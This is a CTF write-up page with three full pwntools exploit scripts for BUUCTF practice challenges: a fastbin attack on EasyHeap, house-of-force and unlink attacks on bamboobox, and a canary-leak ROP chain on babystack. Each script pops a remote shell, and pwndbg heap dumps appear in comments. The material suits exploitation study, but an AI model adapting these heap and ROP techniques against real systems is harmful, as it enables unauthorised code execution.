# buuctf wp part7

[bin file](https://github.com/song-10/notes/tree/master/bin-file)

## [ZJCTF 2019]EasyHeap

```python
from pwn import *
context(os='linux',arch='amd64')
context.log_level='DEBUG'

# we can make magic to a big num by unsorted bin attack and make program read the flag locally
# but there is no such dictory at server,
# so when wen connect to server, we need try other way
# we can get a fake_chunk which point to near of 0x00000000006020E0(heaparray),
# and make one of heaparray point to free@got,
# then we rewirte it potint to sysytem@plt and free a chunk which content is str '/bin/sh\x00'
# in function getshell(), we store '/bin/sh\x00' at id1, and rewrite id0 to free@got by house of sprit

# p = process('./easyheap')
p = remote('node3.buuoj.cn',29661)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

def create(size,content):
    ru("Your choice :")
    s(1)
    ru("Size of Heap : ")
    s(size)
    ru("Content of heap:")
    s(content)

def edit(index,content):
    ru("Your choice :")
    s(2)
    ru("Index :")
    s(index)
    ru("Size of Heap : ")
    s(len(content))
    ru("Content of heap : ")
    s(content)

def delete(index):
    ru("Your choice :")
    s(3)
    ru("Index :")
    s(index)

def dbg():
    gdb.attach(p)
    pause()

def l33t():
    ru("Your choice :")
    s(0x1305)
    ru("Congrt !\n")
    print r()

def read_flag():
    fake_chunk = 0x00000000006020C0 - 0x10

    create(0x20,'aaaa') #id0
    create(0x80,'ABCD') #id1
    create(0x10,'BCDE') #id2

    delete(1)
    payload = p64(0)*5 + p64(0x91) + p64(fake_chunk)*2
    edit(0,payload)
    create(0x80,'bbbb') #id1
    l33t()

def getshell():
    elf = ELF('./easyheap',checksec=False)
    system_plt = elf.plt['system']
    free_got = elf.got['free']
    create(0x68,'a') #id0
    create(0x68,'b') #id1
    create(0x68,'c') #id2 is used to get a fake_chunk which point to heaparray  [0]
    delete(2)
    # dbg()
    # pwndbg> x/4g 0x00000000006020e0 -0x40 + 0xd
    # 0x6020ad: 0x43ed0238e0000000  0x000000000000007f
    # 0x6020bd: 0x0000000000000000  0x0000000000000000

    payload = '/bin/sh\x00' + p64(0)*12 + p64(0x71) + p64(0x00000000006020e0    -0x40 + 0xd)
    edit(1,payload)
    # dbg()
    # pwndbg> fast
    # fastbins
    # 0x20: 0x0
    # 0x30: 0x0
    # 0x40: 0x0
    # 0x50: 0x0
    # 0x60: 0x0
    # 0x70: 0x15d40e0 -> 0x6020ad <- 0x0

    create(0x68,'b') #id1
    create(0x68,'d') #fake_chunk
    payload = p64(0)*4 + '\x00'*3 + p64(free_got)
    edit(3,payload)
    # dbg()
    # pwndbg> x/x 0x6020e0
    # 0x6020e0 <heaparray>: 0x0000000000602018
    # now, id0 is point to free@got and id1's content is '/bin/sh\x00'

    edit(0,p64(system_plt))
    # dbg()
    # pwndbg> x/x 0x6020e0
    # 0x6020e0 <heaparray>: 0x00602018 <- free@got
    # pwndbg> x/x 0x00400700 <- system@plt
    # 0x602018: 0x00602038

    delete(1)
    itr()
    # dbg()

if __name__ == '__main__':
    getshell()
    # read_flag()
```

## hitcontraining_bamboobox

```python
from pwn import *
from LibcSearcher import LibcSearcher
context(os='linux',arch='amd64')
context.log_level='DEBUG'

# there are two ways to get flag
# one for hof,this way colud read flag and print it
# one for unlink,this way could get shell

# p = process('./bamboobox')
p = remote('node3.buuoj.cn',26203)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

def show():
    ru("Your choice:")
    s(1)
    ru(' : ')
    return r(6)

def add(len,name):
    ru("Your choice:")
    s(2)
    ru("Please enter the length of item name:")
    s(len)
    ru("Please enter the name of item:")
    s(name)

def chage(index,name):
    ru("Your choice:")
    s(3)
    ru("Please enter the index of item:")
    s(index)
    ru("Please enter the length of item name:")
    s(len(name))
    ru("Please enter the new name of the item:")
    s(name)

def remove(index):
    ru("Your choice:")
    s(4)
    ru("Please enter the index of item:")
    s(index)

def dbg():
    gdb.attach(p)
    pause()

def hof():
    add(0x30,'aaa') #id0
    # dbg()
    # pwndbg> x/16g 0x10d0020
    # 0x10d0020:    0x0000000000000000  0x0000000000000041 <- id0
    # 0x10d0030:    0x0000000000616161  0x0000000000000000
    # 0x10d0040:    0x0000000000000000  0x0000000000000000
    # 0x10d0050:    0x0000000000000000  0x0000000000000000
    # 0x10d0060:    0x0000000000000000  0x0000000000020fa1 <- top chunk
    # 0x10d0070:    0x0000000000000000  0x0000000000000000


    offset = 0x10d0000 - 0x10d0060
    malloc_size = offset - 0x8 # SIZE_SZ = 0x8(at 64 bit)
    payload = 'a'*0x30 + 'a'*8 + p64(0xffffffffffffffff)
    chage(0,payload)
    # dbg()
    # pwndbg> x/16g 0x237b020
    # 0x237b020:    0x0000000000000000  0x0000000000000041
    # 0x237b030:    0x6161616161616161  0x6161616161616161
    # 0x237b040:    0x6161616161616161  0x6161616161616161
    # 0x237b050:    0x6161616161616161  0x6161616161616161
    # 0x237b060:    0x6161616161616161  0xffffffffffffffff <- top chunk
    # 0x237b070:    0x0000000000000000  0x0000000000000000

    add(malloc_size,'bbb')
    # dbg()
    # pwndbg> x/16g &main_arena
    # 0x7fcde41dbb20 <main_arena>:  0x0000000100000000  0x0000000000000000
    # 0x7fcde41dbb30 <main_arena+16>:   0x0000000000000000  0x0000000000000000
    # 0x7fcde41dbb40 <main_arena+32>:   0x0000000000000000  0x0000000000000000
    # 0x7fcde41dbb50 <main_arena+48>:   0x0000000000000000  0x0000000000000000
    # 0x7fcde41dbb60 <main_arena+64>:   0x0000000000000000  0x0000000000000000
    # 0x7fcde41dbb70 <main_arena+80>:   0x0000000000000000  0x0000000001e9f000 < top chunk
    # 0x7fcde41dbb80 <main_arena+96>:   0x0000000000000000  0x00007fcde41dbb78
    # 0x7fcde41dbb90 <main_arena+112>:  0x00007fcde41dbb78  0x00007fcde41dbb88
    # pwndbg> x/16g 0x0000000001e9f000
    # 0x1e9f000:    0x0000000000000000  0x0000000000000059
    # 0x1e9f010:    0x0000000000400896  0x00000000004008b1
    # 0x1e9f020:    0x0000000000000000  0x0000000000000041 <- id0
    # 0x1e9f030:    0x6161616161616161  0x6161616161616161
    # 0x1e9f040:    0x6161616161616161  0x6161616161616161
    # 0x1e9f050:    0x6161616161616161  0x6161616161616161
    # 0x1e9f060:    0x6161616161616161  0x00ffffffffffffa1
    # 0x1e9f070:    0x0000000000000000  0x0000000000000000

    add(0x10,p64(0x400D49)*2)
    # dbg()
    # pwndbg> x/8g 0x1523000
    # 0x1523000:    0x0000000000000000  0x0000000000000021
    # 0x1523010:    0x0000000000400d49  0x0000000000400d49 <- magic
    # 0x1523020:    0x0000000000000000  0x0000000000000039
    # 0x1523030:    0x6161616161616161  0x6161616161616161

    print ru("Your choice:")
    s(5)
    print r()

def unlinnk():
    elf = ELF('./bamboobox',checksec=False)
    atoi_got = elf.got['atoi']
    add(0x40,'aaa') #id0
    add(0x80,'bbb') #id1
    add(0x10,'ccc') #id2, in orderto aovid id1 combine with top chunk when we free it
    target = 0x006020C8 # box
    fake_chunk = p64(0) + p64(0x41)
    fake_chunk += p64(target - 0x18) + p64(target - 0x10)
    fake_chunk += p64(0)*4
    fake_chunk += p64(0x40) + p64(0x90)
    chage(0,fake_chunk)
    # dbg()
    # pwndbg> x/16g 0xe1f020
    # 0xe1f020: 0x0000000000000000  0x0000000000000051
    # 0xe1f030: 0x0000000000000000  0x0000000000000041
    # 0xe1f040: 0x00000000006020b0  0x00000000006020b8
    # 0xe1f050: 0x0000000000000000  0x0000000000000000
    # 0xe1f060: 0x0000000000000000  0x0000000000000000
    # 0xe1f070: 0x0000000000000040  0x0000000000000090 <- id1
    # 0xe1f080: 0x0000000000626200  0x0000000000000000
    # 0xe1f090: 0x0000000000000000  0x0000000000000000
    remove(1)
    # dbg()
    # pwndbg> x/16g 0x161d020
    # 0x161d020:    0x0000000000000000  0x0000000000000051
    # 0x161d030:    0x0000000000000000  0x00000000000000d1
    # 0x161d040:    0x00007f8f5abacb78  0x00007f8f5abacb78
    # 0x161d050:    0x0000000000000000  0x0000000000000000
    # 0x161d060:    0x0000000000000000  0x0000000000000000
    # 0x161d070:    0x0000000000000040  0x0000000000000090
    # 0x161d080:    0x0000000000626200  0x0000000000000000
    # 0x161d090:    0x0000000000000000  0x0000000000000000
    # now id0 point to fake_chunk's fd(0x006020b0) which at .bss
    # we jsut need to padding to 0x00000000006020C0(itemlist) and rewite it to atoi@got
    # and then leak the libc
    # dbg()
    payload = p64(0)*2 + p64(0x40) + p64(atoi_got)
    chage(0,payload)
    atoi_addr = u64(show().ljust(8,'\x00'))
    leak('atoi',atoi_addr)
    libc = LibcSearcher('atoi',atoi_addr)
    libc_base = atoi_addr - libc.dump('atoi')
    system_addr = libc_base + libc.dump('system')
    leak('system',system_addr)
    # dbg()
    # pwndbg> x/16g 0x006020b0
    # 0x6020b0 <stdin@@GLIBC_2.2.5>:    0x0000000000000000  0x0000000000000000
    # 0x6020c0 <itemlist>:  0x0000000000000040  0x0000000000602068
    # 0x6020d0 <itemlist+16>:   0x0000000000000000  0x0000000000000000
    # 0x6020e0 <itemlist+32>:   0x0000000000000010  0x0000000001050110
    # 0x6020f0 <itemlist+48>:   0x0000000000000000  0x0000000000000000
    # 0x602100 <itemlist+64>:   0x0000000000000000  0x0000000000000000
    # 0x602110 <itemlist+80>:   0x0000000000000000  0x0000000000000000
    # 0x602120 <itemlist+96>:   0x0000000000000000  0x0000000000000000

    chage(0,p64(system_addr))
    # dbg()
    # pwndbg> x/16g 0x0000000000602068
    # 0x602068: 0x00007f66cc821390  0x0000000000400700 <- aoti@got was chaged to system@got
    # 0x602078: 0x0000000000000000  0x0000000000000000
    # 0x602088: 0x0000000000000000  0x0000000000000000

    ru("Your choice:")
    sl('sh')
    # dbg()
    itr()

if __name__ == '__main__':
    unlinnk()
    # hof()
```

## others_babystack

```python
from pwn import *
from LibcSearcher import LibcSearcher
context(os='linux',arch='amd64')
context.log_level='DEBUG'

# leak canary by option print
# and pass the canary leak thelibc by rop attack
# get shell by rop attcak finally

# p = process('./babystack')
p = remote('node3.buuoj.cn',28802)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

# leak canary
ru(">> ")
s(1)
s('A'*(0x90-0x8) + 'B')
ru(">> ")
s(2)
ru('B')
canary = u64('\x00'+r(7))
leak('canary',canary)

# leak puts_addr by rop attack
elf = ELF('./babystack',checksec=False)
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = 0x0000000000400908
pop_rdi = 0x0000000000400a93 # pop rdi ; ret
ru(">> ")
s(1)
payload = 'A'*(0x90-0x8) + p64(canary) + 'B'*8
payload += flat([pop_rdi, puts_got, puts_plt, main])
s(payload)
ru(">> ")
s(3)
puts_addr = u64(ru('\n').ljust(8,'\x00'))
leak("puts",puts_addr)

# calculate the libc addr
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
leak('system',system_addr)
binsh = libc_base + libc.dump('str_bin_sh')
leak('binsh',binsh)

# get shell by rop chain
ru(">> ")
s(1)
payload = 'A'*(0x90-0x8) + p64(canary) + 'B'*8
payload += flat([pop_rdi, binsh, system_addr, main])
s(payload)
ru(">> ")
s(3)
sleep(0.1)
itr()
```
